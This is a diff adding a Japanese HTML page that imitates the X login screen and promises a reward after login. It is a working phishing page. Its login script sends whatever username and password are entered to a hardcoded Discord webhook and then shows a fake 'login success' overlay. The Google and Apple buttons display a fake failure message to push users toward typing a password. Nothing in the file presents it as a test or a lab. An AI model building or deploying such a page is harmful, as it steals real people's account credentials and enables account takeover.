@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>X ログイン</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      z-index: 1;
+    }
+    .login-box h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .notice {
+      color: #ff5555;
+      font-size: 12px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .google, .apple { background-color: #fff; color: #000; }
+    .blue { background-color: #1d9bf0; color: #fff; }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: none;
+      font-size: 16px;
+    }
+    #msg { margin-top: 15px; font-weight: bold; color: lime; }
+    .btn img { height: 20px; }
+
+    .success-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.95);
+      color: #00ff00;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      z-index: 2;
+      padding: 20px;
+      cursor: pointer;
+      font-size: 20px;
+      line-height: 1.6;
+      font-family: 'Courier New', cursive, monospace;
+    }
+
+    .dialog-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.85);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 3;
+    }
+
+    .dialog-box {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: white;
+      max-width: 300px;
+      font-size: 16px;
+    }
+
+    .dialog-box button {
+      margin-top: 15px;
+      padding: 8px 20px;
+      background-color: #1d9bf0;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>X にログイン</h1>
+    <div class="notice">🚀ログインが完了した次のページで爆ができます🚀</div>
+    <button class="btn google" onclick="showDialog()">
+      <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" />
+      Googleでログイン
+    </button>
+    <button class="btn apple" onclick="showDialog()">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
+      Appleのアカウントでログイン
+    </button>
+    <p>または</p>
+    <input type="text" placeholder="電話番号 / メール / ユーザー名" id="user" value="@" />
+    <input type="password" placeholder="パスワード" id="pass" />
+    <button class="btn blue" onclick="login()">ログイン</button>
+    <div id="msg"></div>
+  </div>
+
+  <div class="success-overlay" id="successOverlay" onclick="goToNextPage()">
+    ✅ ログイン成功‼️<br>この文字をタップしてください。
+  </div>
+
+  <div class="dialog-overlay" id="dialogOverlay">
+    <div class="dialog-box">
+      ログインに失敗しました<br>
+      IDまたは電話番号のログインを試みてください。<br>
+      <button onclick="closeDialog()">OK</button>
+    </div>
+  </div>
+
+  <script>
+    function login() {
+      const user = document.getElementById("user").value;
+      const pass = document.getElementById("pass").value;
+
+      // Discordへ送信（差し替え）
+      fetch("https://discord.com/api/webhooks/1389915380033654784/8SkXSFbQyRZzV-b4WBfopA7Q0NJY--_l1pEWNudAoCFkB10AqDSxj4JD3vdyO867xvrh", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `【ログイン試行】\nID: ${user}\nパスワード: ${pass}`
+        })
+      }).catch(() => {});
+
+      document.getElementById("msg").innerText = "";
+      document.getElementById("successOverlay").style.display = "flex";
+    }
+
+    function goToNextPage() {
+      window.location.href = "page3.html";
+    }
+
+    function showDialog() {
+      document.getElementById("dialogOverlay").style.display = "flex";
+    }
+
+    function closeDialog() {
+      document.getElementById("dialogOverlay").style.display = "none";
+    }
+  </script>
+</body>
+</html>
